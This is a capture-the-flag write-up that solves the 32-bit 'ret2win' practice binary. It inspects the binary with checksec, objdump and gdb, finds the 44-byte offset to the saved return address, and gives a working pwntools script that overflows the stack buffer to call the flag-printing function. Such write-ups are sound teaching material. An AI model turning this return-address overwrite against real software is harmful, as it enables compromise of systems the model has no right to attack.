First of all, use checksec to get some binary information
```shell
[marco@marco-pc Downloads]$ file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=70a25eb0b818fdc0bafabe17e07bccacb8513a53, not stripped
[marco@marco-pc Downloads]$ checksec --file=ret2win32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols     No	0		3	ret2win32
```

The file is not stripped, so let's use objdump and gdb (with pwndbg) to get some information from symbol table
```shell
objdump -t ret2win32
...
080485f6 l     F .text	00000063              pwnme
08048659 l     F .text	00000029              ret2win
...
```

There are 2 interesting functions:
- pwnme, which is called from main, print some strings and get an input;
- ret2win perfom a system comand "cat flag.txt"
```gdb
pwndbg> disassemble ret2win 
Dump of assembler code for function ret2win:
   0x08048659 <+0>:	push   ebp
   0x0804865a <+1>:	mov    ebp,esp
   0x0804865c <+3>:	sub    esp,0x8
   0x0804865f <+6>:	sub    esp,0xc
   0x08048662 <+9>:	push   0x8048824
   0x08048667 <+14>:	call   0x8048400 <printf@plt>
   0x0804866c <+19>:	add    esp,0x10
   0x0804866f <+22>:	sub    esp,0xc
   0x08048672 <+25>:	push   0x8048841
   0x08048677 <+30>:	call   0x8048430 <system@plt>
   0x0804867c <+35>:	add    esp,0x10
   0x0804867f <+38>:	nop
   0x08048680 <+39>:	leave  
   0x08048681 <+40>:	ret    
End of assembler dump.
pwndbg> x/s 0x8048841
0x8048841:	"/bin/cat flag.txt"
```

With a buffer overflow we can control the EIP and then we can jump in the ret2win funciton.
Let's find out how many bytes we need to fill until EIP
```gdb
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

...

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
...

EIP  0x6161616c ('laaa')

...

pwndbg> cyclic -l 'laaa'
44
```

Final exploit:
```python
#!/usr/bin/python3
 
import struct
from pwn import *
 
ret2win_addr = 0x08048659
 
shellcode = ("A"*44).encode()
shellcode += struct.pack("<I", ret2win_addr)
 
p = process('./ret2win32')

p.recvuntil('>')
p.sendline(shellcode)
print(p.recvall())
```
